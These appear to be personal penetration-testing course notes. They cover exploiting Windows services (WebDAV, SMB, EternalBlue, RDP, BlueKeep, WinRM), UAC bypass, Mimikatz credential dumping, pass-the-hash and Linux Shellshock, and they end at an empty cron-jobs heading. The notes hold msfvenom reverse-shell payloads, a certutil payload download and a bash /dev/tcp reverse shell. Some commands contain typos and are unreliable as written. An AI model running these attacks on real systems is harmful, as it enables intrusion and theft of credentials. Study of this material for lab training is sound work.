
# Windows

### Frequently Exploited Windows Services

![[Frequently Exploited Windows Services.png]]

### Exploiting Windows Vulnerabilities
###### Exploiting Microsoft IIS WebDAV
- `nmap -sV -p 80 10.12.23.1 --script=http-enum`
- `hydra -L /path/to/word/list -P /path/to/word/list 10.11.23.12 http-get /webdav/` -- to brute force login
- `davtest -url http://10.12.2.21/webdav` 
   `davtest -auth username:password -url http://10.12.2.21/webdav` -- tells you what type of files you can upload or what types of file can be executed 
- `cadaver https://10.12.23.1` after this find the correct file which can be uploaded and upload it to server. To upload `put /usr/share/webshells/asp/webshell.asp` 
- msfvenom -- to generate payload
	 -  `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR IP> LPORT=1234 -f asp > shell.asp`
	 - `service start postgresql && msfconsole` -- we need db because metasploit framework console requires the actual metasploit framework db
	 - `use multi/handeler`
	 - `set payload windows/meterpreter/reverse_tcp`
	 - `set LHOST <YOUR IP>`
	 - `set LPORT 1234`
	 - `run`
	 - OR
		 - use exploit/windows/iis/iis_webdav_upload_asp 
		 - set RHOSTS 10.0.17.27 
		 - set HttpUsername bob
		 - set HttpPassword password_123321 
		 - set PATH /webdav/metasploit.asp 
		 - exploit

###### Exploiting SMB With PsExec
-  `psexec.py USERNAME@IP cmd_to_run_on_windows`
- OR
	- use exploit/windows/smb/psexec 
	- set RHOSTS 10.0.0.242 
	- set LHOSTS 10.10.12.2
	- set SMBUser Administrator 
	- set SMBPass qwertyuiop 
	- exploit
 
###### Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue) 
- Only works for SMBv1
- `nmap -sV -p 445 --script=smb-vuln-ms17-010 10.10.12.2`
- Msfconsole
	use exploit/windows/smb/ms17_010_eternalblue
	set payload windows/x64/meterpreter/reverse_tcp
	set RHOSTS
	set LHOSTS
	run
- `hashdump` -- run in meterpreter
- `shell` -- to go to the shell
- `john [HashFILE]--wordlist=/home/anurag/Downloads/rockyou.txt --format:NT ` -- to crack hashdump

###### Exploiting RDP
- use metasploit to confirm the port which is using RDP
	use auxiliary/scanner/rdp/rdp_scanner
	set RHOSTS 10.2.24.86
	set RPORT 3333
	run
- `hydra -L path/to/user/wordlist -P path/to/password/wordlist rdp://10.2.24.86 -s 3333 ` -- to brute force login cred (you can use '-t' to change the speed default is 16 put it to 2 or 3 to not cause DOS on server)
- `xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[IP:PORT]`

###### Exploiting Windows CVE-2019-0708 RDP Vulnerability (BlueKeep)
- Msfconsole
	- use auxiliary/scanner/rdp/cve_2019_0708_bluekeep   -- to check if target is vulnerable to bluekeep or not
	- use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
	   set RHOSTS 10.10.10.7
	   set payload /windows/x64/meterpreter/reverce_tcp    -- only if not set by default
	   set LHOSTS
	   set LPORT
	   set RPORT   -- if not default port
	   set target -- set the target (see shoe target)
	   exploit

###### Exploiting WinRM
- `crcakmapexec winrm [IP] -u [USERNAME] -p path/to/wordlist` -- to password brute force
- `crcakmapexec winrm [IP] -u [USERNAME] -p [PASSWORD] -x "CMD"` -  to run arbitrary cmd on system  
- `evil-winrm.rb -u [USERNAME] -p 'PASSWORD' -i [IP]` -- to get shell 
   Or Msfconsole
	use exploit/windows/winrm/winrm_script_exec
	set RHOSTS 10.0.0.173
	set USERNAME administrator
	set PASSWORD tinkerbell
	set FORCE_VBS true
	exploit


### Windows Privilege Escalation
###### Windows Kernel Exploits
- `getsystem` -- inbuild meterpreter cmd that allows you to automatically elevate your privileges on the target system
- `use post/multi/recon/local_exploit_suggester` --  this will enum all the known vuln within this particular version of windows 
   OR manual
   - GitHub: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

###### Bypassing UAC With UACMe (lab is little difficult)
- In order to successfully bypass UAC, we will need to have access to a user account
that is a part of the local administrators group on the Windows target system 
`net localgroup administrators`
- GitHub: https://github.com/hfiref0x/UACME -- to bypass UAC
	- by using `Akagai64.exe 23 path/to/backdoor/` we can elevate the privileges 
	- We will create the backdoor by msfvenom `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your ip] LPORT=1234 -f exe > backdoor.exe`
	- After that run msfconsole  
		   use exploit/multi/handler
		   set payload windows/meterpreter/reverse_tcp
		   set LHOST (your ip)
		   set LPORT 1234
		   run
	- Now upload the backdoor `upload backdoor.exe` and `upload /path/to/Akagai64.exe`
	- `./Akagai46.exe 23 /path/to/backdoor` 

###### Access Token Impersonation
- An access token will typically be assigned one of the following security levels:
	- Impersonate-level tokens are created as a direct result of a non-interactive login on
	Windows, typically through specific system services or domain logons.
	-  Delegate-level tokens are typically created through an interactive login on Windows,
	primarily through a traditional login or through remote access protocols such as RDP.

- The following are the privileges that are required for a successful impersonation attack:
	- SeAssignPrimaryToken: This allows a user to impersonate tokens.
	- SeCreateToken: This allows a user to create an arbitrary token with administrative
	privileges.
	- SeImpersonatePrivilege: This allows a user to create a process under the security
	context of another user typically with administrative privileges.
- `load incognito` -- load after we get meterpreter session
- `list_tokens -u` -- to list user account access tokens
- `impersonate_token "[TOKEN NAME]"` 


### Windows Credential Dumping
###### Windows Password Hashes
- The LSA (Local Security Authority) or LSASS (Local Security Authority SubSystem) is responsible for authentication on Windows. And this particular service also has a cache of memory that will contain hashes as it interact with SAM database
- Elevated/Administrative privileges are required in order to access and interact with the LSASS process.
###### Searching For Passwords In Windows Configuration Files
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[YOU IP] LPORT=1234 -f exe > payload.exe`
- `python -m SimpleHTTPServer 80` -- on your machine
   `certutil -urlcache -f http://[Your IP]/payload.exe payload.exe` -- on attacker/victim machine
   On Msfconsole
   `use multi/handler`
   `set payload windows/x64/meterpreter/reverse_tcp`
   `set LPORT 1234`
   `set LHOST`
- OR you can run [this](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) on windows system `. .\PowerUp.ps1` `Invoke-PrivescAudit` if not working try `powershell -ep bypass` then run the script
###### Dumping Hashes With Mimikatz
- `pgrep lsass` then `migrate [pid for lsass]`
- With kiwi module
	`load kiwi` -- to load the utility (use it after getting meterpreter session)
	`creds_all` -- to dump all the credential
	`lsa_dump_sam` -- it will dump all NTLM hashes
   - Now with mimikatz
	   `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
	   `shell`
	   `.\mimikatz.exe`
	   `prvilege::debug` -- if gives Privilege '20' ok then you have required privilege in order to perform hash extraction from memory
	   `lsadump::sam`
	   `sekurlsa::logonpasswords`

###### Pass-The-Hash Attacks
- `hashdump` -- copy LM and NT hash
- Using msfconsole module
	- `use exploit/windows/smb/psexec`
	- `LPORT 4422` -- different from meterpreter session
	- `set RHOST [target IP]`
	- `set SMBUser [username]`
	- `set SMBPass [LM:NT for the user]`
	- `set target Native\ upload`
- Using crackmapexec 
	- `crackmapexec smb [IP] -u [USERNAME] -H "[NT hash]"` -- -H for hash
	- `crackmapexec smb [IP] -u [USERNAME] -H "[NT hash]" -x "[cmd]"`


# Linux

### Frequently Exploited Linux Services

![[Frequently Exploited Linux Services.png]]

### Exploiting Linux Vulnerabilities

###### Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock)
- `nmap -sV 10.12.23.2 --script=http-shellshock --script-args "http-shellshock.uri=/urlname.cgi"`
- open burp and send the request to repeater. add the below in User-Agent 
	`() { :; }; echo; echo; /bin/bash -c 'cat /etc/password` -- to check if attack is possible
	`() { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'` and open `nv -nlvp 9001`
- Using msfconsole
	 use exploit/multi/http/apache_mod_cgi_bash_env_exec
	 set RHOST
	 set TARGETURI /cgipath.cgi
	 exploit

###### Exploiting SAMBA
- it same as [[Assessment Methodologies#SMB(Server Message Block)]] smb 

### Linux Privilege Escalation

###### Linux Kernel Exploits
- GitHub: https://github.com/mzet-/linux-exploit-suggester -- this will enum all the known vulnerability within this particular version of Linux.

###### Exploiting Misconfigured Cron Jobs
- 